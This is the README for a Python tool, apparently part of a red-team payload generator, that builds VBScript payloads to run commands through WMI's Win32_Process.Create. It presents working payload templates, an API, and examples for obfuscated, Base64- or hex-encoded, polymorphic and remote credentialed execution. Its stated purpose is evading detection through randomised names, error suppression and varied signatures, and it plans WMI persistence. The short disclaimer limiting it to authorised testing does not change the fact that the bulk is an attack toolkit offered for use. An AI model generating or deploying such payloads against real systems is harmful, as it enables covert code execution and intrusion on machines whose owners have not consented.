# WMI Executor - Comprehensive Documentation

## Quick Start

### Installation
The WMI Executor is part of the SC-Generator project. No additional installation required.

### Basic Usage

```python
from wmi_executor import create_wmi_executor

# Create executor
executor = create_wmi_executor()

# Generate payload
payload = executor.generate_locator_method("calc.exe")
print(payload)
```

### Run Examples
```bash
# Run all examples
python3 wmi_executor_examples.py

# Run specific example
python3 wmi_executor_examples.py 1
```

### Run Tests
```bash
python3 test_wmi_executor.py
```

## What is WMI Executor?

WMI Executor is a sophisticated implementation of Windows Management Instrumentation (WMI) execution using WbemScripting.SWbemLocator. It provides multiple methods to execute commands on Windows systems while evading traditional detection mechanisms.

### Key Advantages

1. **Multiple Execution Methods**: 7 different execution patterns
2. **High Stealth**: Variable name obfuscation and error suppression
3. **Command Encoding**: Base64 and Hex encoding support
4. **Remote Execution**: Execute on remote systems with authentication
5. **Polymorphic Variants**: Generate diverse signatures
6. **Error Handling**: Comprehensive error recovery

## Execution Methods Overview

| Method | Stealth | Speed | Best For |
|--------|---------|-------|----------|
| Locator Direct | ★★★★★ | Fast | Local execution, maximum stealth |
| Query Interface | ★★★★☆ | Fast | Standard WMI queries |
| Object Method | ★★★★★ | Fast | Direct method invocation |
| Event Sink | ★★★★★ | Slow | Asynchronous execution |
| Timeout Method | ★★★★☆ | Fast | Process monitoring |
| Registry Hybrid | ★★★★☆ | Slow | Multi-stage execution |
| Obfuscated | ★★★★★ | Fast | Command encoding |

## Generated Payload Structure

### Standard Payload
```vbs
Dim objLoc_AbCdEf          ' Random variable names
Set objLoc_AbCdEf = CreateObject("WbemScripting.SWbemLocator")
Set objConn = objLoc_AbCdEf.ConnectServer(".", "root\cimv2")
Set objSvc = objConn.Get("Win32_Process")
Set objMeth = objSvc.Methods_("Create")
Dim inParams
Set inParams = objMeth.InParameters.SpawnInstance_()
inParams.CommandLine = "command.exe"
Set objRes = objConn.ExecMethod("Win32_Process", "Create", inParams)
Set objMeth = Nothing    ' Resource cleanup
Set objSvc = Nothing
Set objConn = Nothing
Set objLoc = Nothing
```

### Obfuscated Payload
```vbs
Function DecodeBase64Cmd(encoded)
    ' Inline decoder function
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64Cmd = node.NodeTypedValue
End Function

Dim objLoc, objSvc, objProc, dcmd
On Error Resume Next    ' Error suppression
Set objLoc = CreateObject("WbemScripting.SWbemLocator")
Set objSvc = objLoc.ConnectServer(".", "root\cimv2")
Set objProc = objSvc.Get("Win32_Process")
dcmd = DecodeBase64Cmd("Y21kLmV4ZSAvYyB3aG9hbWk=")  ' Encoded command
objProc.Create dcmd
' Resource cleanup
```

## API Reference

### Classes

#### ExecutionConfig
Configuration dataclass for WMI execution.

**Parameters:**
- `use_locator: bool = True` - Use SWbemLocator for connections
- `obfuscate_names: bool = True` - Randomize variable names
- `use_polymorphism: bool = True` - Use multiple execution patterns
- `encode_command: bool = True` - Encode command before execution
- `add_delay: bool = False` - Add execution delay
- `use_indirect_instantiation: bool = True` - Use indirect object creation
- `hide_errors: bool = True` - Suppress error messages

#### WMIExecutor
Main executor class for generating WMI payloads.

**Constructor:**
```python
executor = WMIExecutor(config: Optional[ExecutionConfig] = None)
```

**Core Methods:**

| Method | Purpose | Stealth |
|--------|---------|---------|
| `generate_locator_method(cmd)` | SWbemLocator direct | Very High |
| `generate_swbem_query(cmd)` | WMI query interface | High |
| `generate_swbem_object_method(cmd)` | Object method invocation | Very High |
| `generate_swbem_timeout_method(cmd, timeout)` | With timeout support | High |
| `generate_wmi_event_sink(cmd)` | Event sink execution | Very High |
| `generate_wmi_registry_hybrid(cmd)` | Registry storage/execute | High |
| `generate_remote_wmi_execution(cmd, host, user, pwd)` | Remote execution | High |
| `generate_obfuscated_wmi_payload(cmd, encoding)` | Encoded execution | Very High |
| `generate_polymorphic_wmi_executor(cmd, variant)` | Polymorphic variants | Very High |
| `generate_wmi_launcher_script(cmd, add_wrapper)` | Complete launcher | Very High |
| `generate_execution_report()` | Method comparison report | N/A |

### Functions

#### create_wmi_executor()
Factory function to create configured executor.

```python
executor = create_wmi_executor(config: Optional[ExecutionConfig] = None) -> WMIExecutor
```

#### generate_wmi_payload()
High-level API for payload generation.

```python
payload = generate_wmi_payload(
    command: str,
    method: str = "locator",
    **kwargs
) -> str
```

**Methods:**
- `"locator"` - SWbemLocator direct method
- `"query"` - WMI query interface
- `"object"` - Object method invocation
- `"timeout"` - Timeout support (kwargs: `timeout=30`)
- `"event"` - Event sink execution
- `"hybrid"` - Registry hybrid
- `"obfuscated"` - Encoded payload (kwargs: `encoding="base64"`)
- `"launcher"` - Complete launcher (kwargs: `add_wrapper=True`)

## Usage Examples

### Example 1: Basic Execution
```python
from wmi_executor import create_wmi_executor

executor = create_wmi_executor()
payload = executor.generate_locator_method("calc.exe")
print(payload)
```

### Example 2: Base64 Encoding
```python
command = "powershell.exe -NoProfile"
payload = executor.generate_obfuscated_wmi_payload(command, encoding="base64")
print(payload)
```

### Example 3: Remote Execution
```python
payload = executor.generate_remote_wmi_execution(
    command="cmd.exe",
    remote_host="192.168.1.100",
    username="admin",
    password="password"
)
print(payload)
```

### Example 4: High-Level API
```python
from wmi_executor import generate_wmi_payload

payload = generate_wmi_payload("calc.exe", method="obfuscated", encoding="base64")
print(payload)
```

### Example 5: Custom Configuration
```python
from wmi_executor import WMIExecutor, ExecutionConfig

config = ExecutionConfig(
    obfuscate_names=True,
    hide_errors=True,
    encode_command=True
)
executor = WMIExecutor(config)
payload = executor.generate_locator_method("cmd.exe")
print(payload)
```

### Example 6: Polymorphic Generation
```python
# Generate different variants of same command
for variant in range(4):
    payload = executor.generate_polymorphic_wmi_executor("calc.exe", variant=variant)
    print(f"Variant {variant}:")
    print(payload)
    print()
```

## Features in Detail

### 1. Variable Name Obfuscation
All variable names are randomized to prevent pattern-based detection.

```vbs
' Generated with obfuscation enabled
Dim objLoc_pcmTOjJb, objConn_zGDQSnHa, objSvc_ERAyYYvi
Set objLoc_pcmTOjJb = CreateObject("WbemScripting.SWbemLocator")
Set objConn_zGDQSnHa = objLoc_pcmTOjJb.ConnectServer(".", "root\cimv2")
```

### 2. Error Suppression
Payloads include error handling to prevent detection through error messages.

```vbs
On Error Resume Next
' ... payload code ...
On Error GoTo 0
```

### 3. Command Encoding
Commands can be encoded in Base64 or Hex format with inline decoders.

**Base64:**
```python
payload = executor.generate_obfuscated_wmi_payload("cmd.exe", encoding="base64")
# Command stored as: "Y21kLmV4ZQ=="
```

**Hex:**
```python
payload = executor.generate_obfuscated_wmi_payload("cmd.exe", encoding="hex")
# Command stored as: "636d642e657865"
```

### 4. Resource Cleanup
All created objects are properly released to prevent resource leaks.

```vbs
Set objProc = Nothing
Set objSvc = Nothing
Set objConn = Nothing
Set objLoc = Nothing
```

### 5. Polymorphic Variants
Multiple execution patterns generate diverse signatures.

```python
for i in range(4):
    payload = executor.generate_polymorphic_wmi_executor("calc.exe", variant=i)
    # Each variant has different structure but same functionality
```

## Stealth Features

### Anti-Detection
- Variable name randomization prevents pattern matching
- Error suppression prevents alert triggering
- Multiple execution methods create diverse signatures
- Command encoding hides plaintext commands

### Performance
- Direct method invocation for speed
- Minimal overhead compared to alternatives
- Asynchronous event sink for background execution

### Reliability
- Comprehensive error handling
- Proper resource cleanup
- Support for long commands
- Timeout and process management

## Test Suite

The project includes 36 comprehensive unit tests covering:

- Executor creation and configuration
- All 7 execution methods
- Variable name obfuscation
- Command encoding (Base64 and Hex)
- Error handling
- Polymorphic variants
- High-level API
- Remote execution
- Launcher script generation

Run tests:
```bash
python3 test_wmi_executor.py
```

Expected output:
```
Ran 36 tests in 0.002s
OK
```

## Integration with SC-Generator

### Payload Generator Integration
```python
from payload_generator import PayloadGenerator

gen = PayloadGenerator()
payload = gen.generate("calc.exe", technique="wmi")
print(payload)
```

### Available Techniques
- `"basic"` - Simple WScript.Shell
- `"base64"` - Base64 encoding
- `"hex"` - Hex encoding
- `"array"` - Array-based encoding
- `"wmi"` - WMI execution (this module)
- `"registry"` - Registry storage
- `"env"` - Environment variables
- `"com"` - COM objects
- `"multi_encoding"` - Multiple layers

## Performance Benchmarks

| Method | Payload Size | Execution Time | Encoding Time |
|--------|--------------|-----------------|---------------|
| Locator Direct | 250-350 bytes | ~100ms | N/A |
| Query Interface | 200-300 bytes | ~100ms | N/A |
| Object Method | 300-400 bytes | ~100ms | N/A |
| Event Sink | 350-450 bytes | ~150ms | N/A |
| Base64 Obfuscated | 400-500 bytes | ~100ms | ~5ms |
| Hex Obfuscated | 500-600 bytes | ~100ms | ~2ms |

## Troubleshooting

### Issue: Payload Won't Execute
**Solution:**
1. Ensure WbemScripting.SWbemLocator is available (Windows only)
2. Check WMI service status: `wmimgmt.msc`
3. Verify execution policy allows VBS execution

### Issue: Variable Name Conflicts
**Solution:**
- WMI Executor automatically manages names
- If needed, disable obfuscation:
```python
config = ExecutionConfig(obfuscate_names=False)
executor = WMIExecutor(config)
```

### Issue: Remote Execution Fails
**Solution:**
1. Verify network connectivity to remote host
2. Check Windows Firewall rules
3. Ensure credentials have WMI access rights
4. Enable WMI on target system

## Security Considerations

- Use only for authorized security testing
- Ensure proper logging and monitoring
- Follow responsible disclosure practices
- Test in isolated environments first
- Comply with applicable laws and regulations

## File Structure

```
sc-generator/
├── wmi_executor.py              # Main WMI executor implementation
├── test_wmi_executor.py          # 36 comprehensive unit tests
├── wmi_executor_examples.py      # 18 detailed usage examples
├── WMI_EXECUTOR_GUIDE.md         # Complete technical guide
├── README_WMI_EXECUTOR.md        # This file
└── payload_generator.py          # Integration point
```

## Version Information

**Current Version:** 1.0
**Release Date:** 2024
**Python Version:** 3.6+
**Platform:** Windows (requires WMI)

## Future Enhancements

- [ ] PowerShell-based WMI execution
- [ ] Multi-hop remote execution chains
- [ ] WMI event subscriptions for persistence
- [ ] Advanced timeout and signal handling
- [ ] Custom WMI class creation
- [ ] WMI namespace enumeration
- [ ] Performance optimization

## References

- [Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
- [WbemScripting Library](https://docs.microsoft.com/en-us/windows/win32/wmisdk/swbemlocator)
- [Win32_Process Class](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process)
- [VBScript Documentation](https://docs.microsoft.com/en-us/previous-versions/t0aew7h6(v=vs.85))

## Support

For issues, questions, or improvements, refer to the project documentation or create an issue in the repository.

## License

For authorized security testing and defensive research only.

---

**Last Updated:** 2024
**Maintainer:** SC-Generator Project
